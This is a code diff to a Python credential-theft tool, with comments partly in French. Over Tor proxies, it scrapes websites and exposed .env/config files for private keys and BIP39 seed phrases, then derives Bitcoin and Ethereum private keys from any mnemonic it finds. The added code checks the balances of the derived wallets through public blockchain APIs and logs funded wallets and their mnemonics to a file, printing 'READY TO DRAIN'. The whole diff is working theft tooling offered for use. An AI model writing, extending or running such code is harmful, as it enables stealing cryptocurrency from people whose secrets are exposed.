@@ -17,6 +17,75 @@ from eth_account import Account
 from bip_utils import Bip39SeedGenerator
 import bip32utils
 import hashlib
+import requests
+import time
+from datetime import datetime
+
+# ====================== BALANCE CHECK FUNCTIONS ======================
+def get_eth_balance(address: str) -> float:
+    try:
+        r = requests.get(
+            f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest",
+            timeout=10
+        )
+        data = r.json()
+        if data.get("status") == "1":
+            return int(data["result"]) / 1e18
+    except:
+        pass
+    return 0.0
+
+def get_btc_balance(address: str) -> float:
+    try:
+        r = requests.get(f"https://mempool.space/api/address/{address}", timeout=10)
+        data = r.json()
+        balance_sat = (data.get("chain_stats", {}).get("funded_txo_sum", 0) -
+                      data.get("chain_stats", {}).get("spent_txo_sum", 0))
+        return round(balance_sat / 100_000_000, 8)
+    except:
+        return 0.0
+
+def check_all_balances(mnemonic: str, btc_addresses: dict, eth_addresses: list):
+    print("\n" + "═"*100)
+    print("💎 BALANCE CHECK ENGINE v1 - SCANNING ALL DERIVED ACCOUNTS")
+    print(f"Mnemonic : {mnemonic}\n")
+    
+    has_funds = False
+    
+    for name, addr in btc_addresses.items():
+        balance = get_btc_balance(addr)
+        print(f"₿  BTC {name:12} → {addr}")
+        print(f"     Balance    : {balance:.8f} BTC")
+        if balance > 0.00005:
+            has_funds = True
+            print("     → FUNDS DETECTED !")
+    
+    print("\n    Ethereum:")
+    for idx, addr in enumerate(eth_addresses):
+        balance = get_eth_balance(addr)
+        print(f"⟠  ETH Account {idx} → {addr}")
+        print(f"     Balance    : {balance:.6f} ETH")
+        if balance > 0.001:
+            has_funds = True
+            print("     → FUNDS DETECTED !")
+    
+    if has_funds:
+        print("\n🚨🚨🚨 WALLET WITH POSITIVE BALANCE FOUND - READY TO DRAIN 🚨🚨🚨")
+        with open("HITS_WITH_BALANCE.txt", "a", encoding="utf-8") as f:
+            f.write(f"\n{'='*90}\n")
+            f.write(f"DATE     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"MNEMONIC : {mnemonic}\n\n")
+            for name, addr in btc_addresses.items():
+                f.write(f"BTC {name}: {addr} | {get_btc_balance(addr):.8f} BTC\n")
+            for idx, addr in enumerate(eth_addresses):
+                f.write(f"ETH {idx}: {addr} | {get_eth_balance(addr):.6f} ETH\n")
+            f.write(f"{'='*90}\n")
+    else:
+        print("Aucun solde significatif détecté.")
+    
+    print("═"*100 + "\n")
+    time.sleep(1.2)  # Respect des limites d'API
+
 
 # ===================== CONFIG =====================
 TOR_PROXIES = {
@@ -129,7 +198,7 @@ def private_key_scanner(base_url):
         print(f"    → Address: {addr}")
         check_balance(addr)
 
-    # BIP39 Mnemonic - FUTURE EXTRACTION ENGINE v4 (clé privée BTC/ETH)
+    # BIP39 Mnemonic - FUTURE EXTRACTION ENGINE v4 (clé privée BTC/ETH + CHECK SOLDE)
     words_found = re.findall(r'\b(?:' + '|'.join(BIP39_WORDS) + r')\b', r.text.lower())
     if len(set(words_found)) >= 12:
         for length in [12, 24]:
@@ -149,22 +218,34 @@ def private_key_scanner(base_url):
                     print("="*130)
                     print(f"    Seed (hex)       : {seed_bytes.hex()}")
                     
-                    # Bitcoin - Legacy, Native Segwit, Wrapped Segwit
+                    btc_addresses = {}
+                    eth_addresses = []
+                    
+                    # ====================== BITCOIN DERIVATIONS ======================
                     root_key = bip32utils.BIP32Key.fromEntropy(seed_bytes)
                     for purpose, name in [(44, "Legacy"), (84, "Native Segwit"), (49, "Wrapped Segwit")]:
                         btc_key = root_key.ChildKey(purpose + bip32utils.BIP32_HARDEN)\
                                           .ChildKey(0 + bip32utils.BIP32_HARDEN)\
                                           .ChildKey(0).ChildKey(0)
-                        print(f"    BTC {name}")
-                        print(f"        WIF         : {btc_key.WalletImportFormat()}")
-                        print(f"        PrivKey     : {btc_key.PrivateKey().hex()}")
-                        print(f"        Address     : {btc_key.Address()}")
+                        wif = btc_key.WalletImportFormat()
+                        priv = btc_key.PrivateKey().hex()
+                        addr = btc_key.Address()
+                        
+                        print(f"    BTC {name:12} | Address : {addr}")
+                        print(f"                  | WIF     : {wif}")
+                        print(f"                  | PrivKey : {priv}")
+                        btc_addresses[name] = addr
                     
-                    # Ethereum - 8 comptes
+                    # ====================== ETHEREUM - 8 comptes ======================
+                    print("\n    Ethereum Accounts:")
                     for idx in range(8):
                         acct = Account.from_mnemonic(mnemonic, account_path=f"m/44'/60'/0'/0/{idx}")
+                        eth_addresses.append(acct.address)
                         print(f"    ETH Account {idx:2} | Address : {acct.address}")
-                        print(f"                  PrivKey : {acct.key.hex()}")
+                        print(f"                  | PrivKey : {acct.key.hex()}")
+                    
+                    # ====================== CHECK DES SOLDES ======================
+                    check_all_balances(mnemonic, btc_addresses, eth_addresses)
                     
                     print("-"*130)
                     break
@@ -181,7 +262,6 @@ def private_key_scanner(base_url):
             content = resp.text[:500]
             print(f"    Preview: {content}...")
 
-            # Parse .env style
             if '.env' in file or 'config' in file:
                 priv_match = re.search(r'(?:PRIVATE_KEY|MNEMONIC|SEED|WALLET_SECRET|API_KEY)=["\']?([A-Za-z0-9_\/+=\-]+)["\']?', resp.text)
                 if priv_match:
@@ -189,7 +269,9 @@ def private_key_scanner(base_url):
 
     print("[*] Private Key & Crypto Scanner finished.\n")
 
+
 def check_balance(address):
+    
     proxies = TOR_PROXIES
     try:
         if address.startswith('0x'):
